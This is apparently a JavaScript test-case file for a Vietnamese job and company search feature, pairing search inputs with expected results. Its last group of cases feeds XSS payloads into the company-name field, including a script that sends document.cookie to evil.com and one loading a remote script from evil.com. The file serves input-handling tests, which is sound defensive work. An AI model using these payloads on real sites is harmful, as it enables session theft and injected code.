var testKey =

{
    TC_001 :[
        {
            in:{
                companyName:"shopee",
                location:"",
                category:"",
                onRecruit: ""
            },
            out:{
                companyName:"shopee",
                location:"",
                category:"",
                onRecruit:"",
                nonResult: false

            }
        }
        ,{
            in:{
                companyName:"random oasid a",
                location:"",
                category:"",
                onRecruit:""
            },
            out:{
                companyName:"",
                location:"",
                category:"",
                onRecruit: "",
                nonResult: true
            }
        }
        ,{
            in:{
                companyName:"soft",
                location:"",
                category:"",
                onRecruit:""
            },
            out:{
                companyName:"soft",
                location:"",
                category:"",
                onRecruit:"",
                nonResult: false
            },
            
        }
        ,{
            in:{
                companyName:"VNG CORPORATION",
                location:"",
                category:"",
                onRecruit:""
            },
            out:{
                companyName:"VNG CORPORATION",
                location:"",
                category:"",
                onRecruit:"",
                nonResult: false
            },
            
        }

    ],
    TC_002:[
         {
            in:{
                companyName:"shopee",
                location:"",
                category:"",
                onRecruit: true
            },
            out:{
                companyName:"shopee",
                location:"",
                category:"",
                onRecruit: true,
                nonResult: false

            }
        }
        ,{
            in:{
                companyName:"random oasid a",
                location:"",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"",
                category:"",
                onRecruit: true,
                nonResult: true
            }
        }
        ,{
            in:{
                companyName:"soft",
                location:"",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"soft",
                location:"",
                category:"",
                onRecruit:true,
                nonResult: false
            },
            
        }
        ,{
            in:{
                companyName:"International",
                location:"",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"International",
                location:"",
                category:"",
                onRecruit:true,
                nonResult: true
            },
            
        }

    ],
    
    TC_003:[
         {
            in:{
                companyName:"",
                location:"",
                category:"it",
                onRecruit: true
            },
            out:{
                companyName:"",
                location:"",
                category:"IT - phần mềm",
                onRecruit: true,
                nonResult: false

            }
        }
        ,{
            in:{
                companyName:"",
                location:"",
                category:"bác sĩ",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"",
                category:"bác sĩ",
                onRecruit: true,
                nonResult: false
            }
        }
        ,{
            in:{
                companyName:"",
                location:"",
                category:"tài chính",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"",
                category:"tài chính",
                onRecruit:true,
                nonResult: false
            },
            
        }
        ,{
            in:{
                companyName:"",
                location:"",
                category:"cơ khí",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"",
                category:"cơ khí",
                onRecruit:true,
                nonResult: true
            },
            
        }
    ]
    ,
    TC_004:[
         {
            in:{
                companyName:"",
                location:"Ho chi minh",
                category:"",
                onRecruit: true
            },
            out:{
                companyName:"",
                location:"hồ chí minh",
                category:"",
                onRecruit: true,
                nonResult: false

            }
        }
        ,{
            in:{
                companyName:"",
                location:"đà nẵng",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"đà nẵng",
                category:"",
                onRecruit: true,
                nonResult: false
            }
        }
        ,{
            in:{
                companyName:"",
                location:"hà nội",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"hà nội",
                category:"",
                onRecruit:true,
                nonResult: false
            },
            
        }
        ,{
            in:{
                companyName:"",
                location:"an giang",
                category:"",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"an giang",
                category:"",
                onRecruit:true,
                nonResult: true
            },
            
        }
    ],
     TC_005:[
         {
            in:{
                companyName:"vng",
                location:"Ho chi minh",
                category:"it",
                onRecruit: true
            },
            out:{
                companyName:"vng",
                location:"hồ chí minh",
                category:"IT",
                onRecruit: true,
                nonResult: false

            }
        }
        ,{
            in:{
                companyName:"soft",
                location:"đà nẵng",
                category:"it",
                onRecruit:true
            },
            out:{
                companyName:"soft",
                location:"đà nẵng",
                category:"it",
                onRecruit: true,
                nonResult: false
            }
        }
        ,{
            in:{
                companyName:"raadslsaw",
                location:"hà nội",
                category:"tài chính",
                onRecruit:true
            },
            out:{
                companyName:"",
                location:"hà nội",
                category:"tài chính",
                onRecruit:true,
                nonResult: true
            },
            
        }
        ,{
            in:{
                companyName:"công ty",
                location:"hà nam",
                category:"điện tử",
                onRecruit:true
            },
            out:{
                companyName:"công ty",
                location:"hà nam",
                category:"điện tử",
                onRecruit:true,
                nonResult: false
            },
            
        }
    ]
    ,
     TC_006:[
         {
            in:{
                companyName:"print database.latestComment",
                location:"Ho chi minh",
                category:"it",
                onRecruit: true
            },
            out:{
                companyName:"print database.latestComment",
                location:"hồ chí minh",
                category:"IT",
                onRecruit: true,
                nonResult: true

            }
        }
        ,{
            in:{
                companyName:"<script>doSomethingEvil();</script>",
                location:"đà nẵng",
                category:"it",
                onRecruit:true
            },
            out:{
                companyName:"<script>doSomethingEvil();</script>",
                location:"đà nẵng",
                category:"it",
                onRecruit: true,
                nonResult: true
            }
        }
        ,{
            in:{
                companyName:"<script>window.location=“http://evil.com/?cookie=” + document.cookie</script>",
                location:"hà nội",
                category:"tài chính",
                onRecruit:true
            },
            out:{
                companyName:"<script>window.location=“http://evil.com/?cookie=” + document.cookie</script>",
                location:"hà nội",
                category:"tài chính",
                onRecruit:true,
                nonResult: true
            },
            
        }
        ,{
            in:{
                companyName:"<script src=http://evil.com/xss.js></script>",
                location:"hà nam",
                category:"điện tử",
                onRecruit:true
            },
            out:{
                companyName:"<script src=http://evil.com/xss.js></script>",
                location:"hà nam",
                category:"điện tử",
                onRecruit:true,
                nonResult: true
            },
            
        }
    ]

}

module.exports = testKey;